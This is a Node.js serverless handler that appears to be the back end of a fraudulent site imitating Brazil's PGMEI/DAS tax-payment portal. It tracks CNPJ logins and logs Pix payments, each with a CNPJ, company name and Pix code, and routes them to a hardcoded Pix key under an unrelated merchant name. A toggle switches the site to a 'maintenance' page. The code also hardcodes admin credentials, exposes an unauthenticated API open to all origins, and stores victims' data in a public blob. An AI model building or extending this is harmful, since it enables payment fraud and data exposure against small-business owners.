const fs = require("fs/promises");
const path = require("path");
const { put, head } = require("@vercel/blob");

const DEFAULT_ADMIN = {
  username: "macaco",
  password: "macaquinhoronald"
};

const DEFAULT_ANALYTICS = {
  visits: 0,
  uniqueVisitors: 0,
  totalClicks: 0,
  cnpjLogins: 0,
  pixGenerated: 0,
  paymentsConfirmed: 0,
  activePage: "primary",
  primaryDomain: "albuquerqueconsultoriameidas.com",
  pixKey: "6769b9cc-dae0-46f1-88db-3144cc4a7ca7",
  pixMerchantName: "SERVICO EMPRESARIAL ASSEGURADO ILTDA",
  pixMerchantCity: "SAO PAULO",
  secondaryTitle: "Estamos em manutencao",
  secondaryMessage: "A equipe da Albuquerque Consultoria MEI DAS esta realizando melhorias para oferecer uma experiencia mais rapida, segura e confiavel. Em breve o atendimento sera retomado.",
  lastVisitAt: "",
  lastPaymentAt: "",
  accessLog: [],
  payments: []
};

const DEFAULT_STATE = {
  admin: DEFAULT_ADMIN,
  analytics: DEFAULT_ANALYTICS
};

const LOCAL_STATE_FILE = path.join(process.cwd(), "app-state.json");
const STATE_BLOB_PATH = process.env.STATE_BLOB_PATH || "pgmei/app-state.json";
const STATE_BLOB_TOKEN = process.env.STATE_BLOB_READ_WRITE_TOKEN || process.env.BLOB_READ_WRITE_TOKEN || "";
const BLOB_ACCESS = "public";

function mergeState(rawState) {
  return {
    admin: {
      ...DEFAULT_ADMIN,
      ...(rawState && rawState.admin ? rawState.admin : {})
    },
    analytics: {
      ...DEFAULT_ANALYTICS,
      ...(rawState && rawState.analytics ? rawState.analytics : {})
    }
  };
}

function normalizeState(rawState) {
  const merged = mergeState(rawState);

  if (!["primary", "secondary"].includes(merged.analytics.activePage)) {
    merged.analytics.activePage = "primary";
  }

  merged.analytics.accessLog = Array.isArray(merged.analytics.accessLog)
    ? merged.analytics.accessLog.slice(0, 8)
    : [];
  merged.analytics.payments = Array.isArray(merged.analytics.payments)
    ? merged.analytics.payments.slice(0, 8)
    : [];

  return merged;
}

function isBlobConfigured() {
  return Boolean(STATE_BLOB_TOKEN);
}

function isVercelRuntime() {
  return Boolean(process.env.VERCEL);
}

async function readLocalState() {
  try {
    const raw = await fs.readFile(LOCAL_STATE_FILE, "utf8");
    return normalizeState(JSON.parse(raw));
  } catch (error) {
    await fs.writeFile(LOCAL_STATE_FILE, JSON.stringify(DEFAULT_STATE, null, 2), "utf8");
    return normalizeState(DEFAULT_STATE);
  }
}

async function writeLocalState(state) {
  const normalized = normalizeState(state);
  await fs.writeFile(LOCAL_STATE_FILE, JSON.stringify(normalized, null, 2), "utf8");
  return normalized;
}

async function readBlobState() {
  try {
    const blobMetadata = await head(STATE_BLOB_PATH, {
      token: STATE_BLOB_TOKEN
    });

    const response = await fetch(blobMetadata.downloadUrl, {
      cache: "no-store"
    });

    if (response.status === 404) {
      return normalizeState(DEFAULT_STATE);
    }
    if (!response.ok) {
      throw new Error(`Falha ao ler Blob: ${response.status}`);
    }

    const rawText = await response.text();
    const parsed = JSON.parse(rawText);

    return normalizeState(parsed);
  } catch (error) {
    const message = String(error && error.message || "");
    if (
      message.includes("404") ||
      message.includes("The requested blob does not exist") ||
      message.includes("BlobNotFoundError") ||
      message.includes("Unexpected token") ||
      message.includes("is not valid JSON")
    ) {
      const defaultState = normalizeState(DEFAULT_STATE);

      try {
        await writeBlobState(defaultState);
      } catch (writeError) {
        return defaultState;
      }

      return defaultState;
    }
    throw error;
  }
}

async function writeBlobState(state) {
  const normalized = normalizeState(state);

  await put(
    STATE_BLOB_PATH,
    JSON.stringify(normalized, null, 2),
    {
      access: BLOB_ACCESS,
      addRandomSuffix: false,
      allowOverwrite: true,
      contentType: "application/json; charset=utf-8",
      token: STATE_BLOB_TOKEN
    }
  );

  return normalized;
}

async function readState() {
  if (isBlobConfigured()) {
    return readBlobState();
  }

  if (isVercelRuntime()) {
    throw new Error("BLOB_NOT_CONFIGURED");
  }

  return readLocalState();
}

async function writeState(state) {
  if (isBlobConfigured()) {
    return writeBlobState(state);
  }

  if (isVercelRuntime()) {
    throw new Error("BLOB_NOT_CONFIGURED");
  }

  return writeLocalState(state);
}

function jsonResponse(res, statusCode, payload) {
  res.statusCode = statusCode;
  res.setHeader("Content-Type", "application/json; charset=utf-8");
  res.setHeader("Cache-Control", "no-store, no-cache, must-revalidate, max-age=0");
  res.end(JSON.stringify(payload));
}

function getAction(reqUrl) {
  return reqUrl.searchParams.get("action") || "get";
}

function getParam(reqUrl, key, fallback = "") {
  const value = reqUrl.searchParams.get(key);
  return value === null ? fallback : value;
}

async function handleAction(action, reqUrl, currentState) {
  if (action === "get") {
    return currentState;
  }

  if (action === "set_active_page") {
    currentState.analytics.activePage = getParam(reqUrl, "page", "primary") === "secondary" ? "secondary" : "primary";
    return writeState(currentState);
  }

  if (action === "update_settings") {
    const title = getParam(reqUrl, "secondaryTitle").trim();
    const message = getParam(reqUrl, "secondaryMessage").trim();

    if (title) {
      currentState.analytics.secondaryTitle = title;
    }
    if (message) {
      currentState.analytics.secondaryMessage = message;
    }

    return writeState(currentState);
  }

  if (action === "track_visit") {
    const now = new Date().toISOString();
    currentState.analytics.visits += 1;
    currentState.analytics.lastVisitAt = now;

    if (getParam(reqUrl, "unique", "0") === "1") {
      currentState.analytics.uniqueVisitors += 1;
    }

    currentState.analytics.accessLog.unshift({
      time: now,
      page: getParam(reqUrl, "page", "primary") === "secondary" ? "secondary" : "primary",
      location: getParam(reqUrl, "location", "/").trim() || "/"
    });

    return writeState(currentState);
  }

  if (action === "increment_metric") {
    const metric = getParam(reqUrl, "metric");
    const amount = Math.max(1, Number.parseInt(getParam(reqUrl, "amount", "1"), 10) || 1);
    const allowedMetrics = new Set(["totalClicks", "cnpjLogins", "pixGenerated", "paymentsConfirmed"]);

    if (!allowedMetrics.has(metric)) {
      throw new Error("INVALID_METRIC");
    }

    currentState.analytics[metric] = (currentState.analytics[metric] || 0) + amount;
    return writeState(currentState);
  }

  if (action === "log_payment") {
    const now = new Date().toISOString();

    currentState.analytics.pixGenerated += 1;
    currentState.analytics.lastPaymentAt = now;
    currentState.analytics.payments.unshift({
      label: getParam(reqUrl, "label", "Pagamento Pix").trim(),
      amount: getParam(reqUrl, "amount", "R$ 0,00").trim(),
      status: "Pendente",
      time: now,
      cnpj: getParam(reqUrl, "cnpj").trim(),
      companyName: getParam(reqUrl, "companyName", "Razao social nao informada").trim(),
      code: getParam(reqUrl, "code").trim()
    });

    return writeState(currentState);
  }

  throw new Error("INVALID_ACTION");
}

module.exports = async (req, res) => {
  const reqUrl = new URL(req.url, `https://${req.headers.host || "localhost"}`);

  res.setHeader("Access-Control-Allow-Origin", "*");
  res.setHeader("Access-Control-Allow-Methods", "GET, POST, OPTIONS");
  res.setHeader("Access-Control-Allow-Headers", "Content-Type");

  if (req.method === "OPTIONS") {
    res.statusCode = 204;
    res.end();
    return;
  }

  try {
    const currentState = await readState();
    const nextState = await handleAction(getAction(reqUrl), reqUrl, currentState);
    jsonResponse(res, 200, nextState);
  } catch (error) {
    const message = String(error && error.message ? error.message : error);

    if (message === "BLOB_NOT_CONFIGURED") {
      jsonResponse(res, 500, {
        error: "BLOB_NOT_CONFIGURED",
        message: "Configure um Blob publico para o estado e a variavel STATE_BLOB_READ_WRITE_TOKEN ou BLOB_READ_WRITE_TOKEN."
      });
      return;
    }

    if (message === "INVALID_ACTION") {
      jsonResponse(res, 400, { error: "INVALID_ACTION" });
      return;
    }

    if (message === "INVALID_METRIC") {
      jsonResponse(res, 400, { error: "INVALID_METRIC" });
      return;
    }

    jsonResponse(res, 500, {
      error: "STATE_API_FAILURE",
      message
    });
  }
};
